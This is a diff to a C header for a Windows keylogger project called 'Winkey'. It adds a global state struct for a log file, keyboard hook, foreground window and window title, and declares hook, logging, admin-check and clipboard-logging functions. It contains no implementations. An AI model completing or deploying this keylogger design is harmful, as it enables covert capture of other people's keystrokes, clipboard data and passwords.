@@ -27,20 +27,33 @@
 	#define NAME		"Winkey"
 	#define VERSION		"1.0.0"
 
+	// Estructura para el estado global del keylogger
+    typedef struct s_winkey_state {
+        FILE   *logFile;          // archivo de log abierto
+        HHOOK   keyboardHook;     // handle del hook instalado
+        HWND    lastWindow;       // última ventana foreground
+        char    lastTitle[256];   // último título logueado
+    }   t_WinkeyState;
+
+	extern t_WinkeyState g_winkeyState;
+
+
 #pragma endregion
 
 #pragma region "Methods"
 
 
-	// llamadas desde el main
+	// main.c
 	BOOL IsAdmin(void);
+
+	// hook.c
 	BOOL ActivateHook(void);
 	void DeactivateHook(void);
 
-	// llamada desde key.c
-	const char* VkCodeToString(DWORD vkCode);
-	// LLamada desde clipboard.c
-	extern FILE* logFile;
+	//log.c
+	BOOL OpenLogFile(void);
+	
+	// clipboard.c
 	void LogClipboardIfChanged(void);
 	
 
